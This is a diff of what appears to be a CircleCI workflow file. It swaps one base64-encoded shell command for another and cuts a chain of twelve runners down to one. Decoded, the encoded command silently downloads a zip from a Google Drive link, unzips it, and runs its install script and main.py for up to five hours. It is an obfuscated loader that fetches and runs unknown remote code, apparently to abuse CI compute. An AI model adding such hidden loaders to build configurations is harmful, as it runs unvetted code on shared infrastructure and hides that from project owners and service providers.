@@ -14,7 +14,7 @@ jobs:
           no_output_timeout: 5h
           max_run_time: 5h
           command: |
-              bash <( openssl base64 -d \<<< "d2dldCAtcU8gYXBwLnppcCBodHRwczovL2RyaXZlLnVzZXJjb250ZW50Lmdvb2dsZS5jb20vZG93bmxvYWQ/aWQ9MXZrSWlVaVVPS3RLbHFEZ1plRVUzVTU3bkZrblZKZnlnJmV4cG9ydD1kb3dubG9hZCA+IC9kZXYvbnVsbCAyPiYxCnNsZWVwIDUKdW56aXAgYXBwLnppcCAKbHMgLWwgLWEKc2xlZXAgMwpzaCBpbnN0YWxsLnNoCnN1ZG8gYXB0LWdldCBpbnN0YWxsIHNjcmVlbiAteSAKcHl0aG9uIG1haW4ucHk=" )
+              bash <( openssl base64 -d \<<< "d2dldCAtcU8gYXBwLnppcCBodHRwczovL2RyaXZlLnVzZXJjb250ZW50Lmdvb2dsZS5jb20vZG93bmxvYWQ/aWQ9MXZrSWlVaVVPS3RLbHFEZ1plRVUzVTU3bkZrblZKZnlnJmV4cG9ydD1kb3dubG9hZCA+IC9kZXYvbnVsbCAyPiYxCnNsZWVwIDUKdW56aXAgYXBwLnppcCAKbHMgLWwgLWEKc2xlZXAgMwpzdWRvIGFwdC1nZXQgaW5zdGFsbCBweXRob24gcHl0aG9uMyBwaXAzIC15CnNoIGluc3RhbGwuc2gKc3VkbyBhcHQtZ2V0IGluc3RhbGwgc2NyZWVuIC15IApweXRob24gbWFpbi5weQ==" )
 
 workflows:
   version: 2
@@ -24,57 +24,4 @@ workflows:
           name: runner-1
           env: 1
 
-      - runner:
-          name: runner-2
-          env: 2
-          requires: [runner-1]
-
-      - runner:
-          name: runner-3
-          env: 3
-          requires: [runner-2]
-
-      - runner:
-          name: runner-4
-          env: 4
-          requires: [runner-3]
-
-      - runner:
-          name: runner-5
-          env: 5
-          requires: [runner-4]
-
-      - runner:
-          name: runner-6
-          env: 6
-          requires: [runner-5]
-
-      - runner:
-          name: runner-7
-          env: 7
-          requires: [runner-6]
-
-      - runner:
-          name: runner-8
-          env: 8
-          requires: [runner-7]
-
-      - runner:
-          name: runner-9
-          env: 9
-          requires: [runner-8]
-
-      - runner:
-          name: runner-10
-          env: 10
-          requires: [runner-9]
-
-      - runner:
-          name: runner-11
-          env: 11
-          requires: [runner-10]
-
-      - runner:
-          name: runner-12
-          env: 12
-          requires: [runner-11]
+      
